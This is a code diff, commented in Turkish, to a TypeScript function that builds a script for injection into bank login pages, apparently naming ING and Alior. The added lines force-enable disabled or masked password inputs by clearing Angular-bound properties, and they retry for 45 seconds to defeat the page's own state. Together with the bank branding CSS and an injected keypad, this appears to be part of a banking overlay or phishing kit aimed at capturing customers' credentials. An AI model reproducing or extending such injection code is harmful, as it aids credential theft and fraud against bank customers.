@@ -547,11 +547,18 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
           st2.textContent = bankCss;
           (root.head || root.documentElement).appendChild(st2);
         }
-        qsa(root, "button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], [inert], ing-button, ing-input-masked-password-field").forEach((el) => {
+        qsa(root, "button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], [inert], fieldset, ing-button, ing-input-masked-password-field, masked-input, password-masked").forEach((el) => {
           try {
             if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
             if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
             if (el.hasAttribute("inert")) el.removeAttribute("inert");
+            // ANGULAR PROPERTY-BINDING: Angular (alior ng-version=18)
+            // disabled/readOnly'yi ATTRIBUTE degil PROPERTY olarak baglar
+            // (el.disabled=true) — attribute temizlense bile property
+            // true kalir ve input gercekten olu dogar. Property'yi de sifirla.
+            try { if ("disabled" in el && el.disabled) el.disabled = false; } catch (e) {}
+            try { if ("readOnly" in el && el.readOnly) el.readOnly = false; } catch (e) {}
+            try { if ("required" in el && el.required) el.required = false; } catch (e) {}
             // ING masked field: "masked" attr gri/maskeli gorunum verir —
             // silinince :host([masked]) stilleri devre disi, kutu beyaz aktif olur
             if (el.hasAttribute("masked") && (el.tagName || "").toUpperCase().indexOf("ING-") === 0) el.removeAttribute("masked");
@@ -755,6 +762,9 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
           try {
             if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
             if (el.hasAttribute("aria-disabled")) el.setAttribute("aria-disabled", "false");
+            // Angular property-binding disabled'i attribute'suz birakabilir
+            try { if ("disabled" in el && el.disabled) el.disabled = false; } catch (e) {}
+            try { if ("readOnly" in el && el.readOnly) el.readOnly = false; } catch (e) {}
             if (el.classList && el.classList.contains("inactive")) {
               el.classList.remove("inactive");
               el.classList.add("active");
@@ -1161,7 +1171,10 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       cleanupErrorState(document);
       updateSubmitReady(document);
       renderKeypad();
-      if (++tries > 30) clearInterval(retry);
+      // Angular bootstrap + ilk change-detection dongusu birkaç saniye
+      // surebilir; property-disabled'in yeniden set edilmesine karsi
+      // 45sn boyunca temizlemeye devam et.
+      if (++tries > 90) clearInterval(retry);
     }, 500);
   })();`;
 }
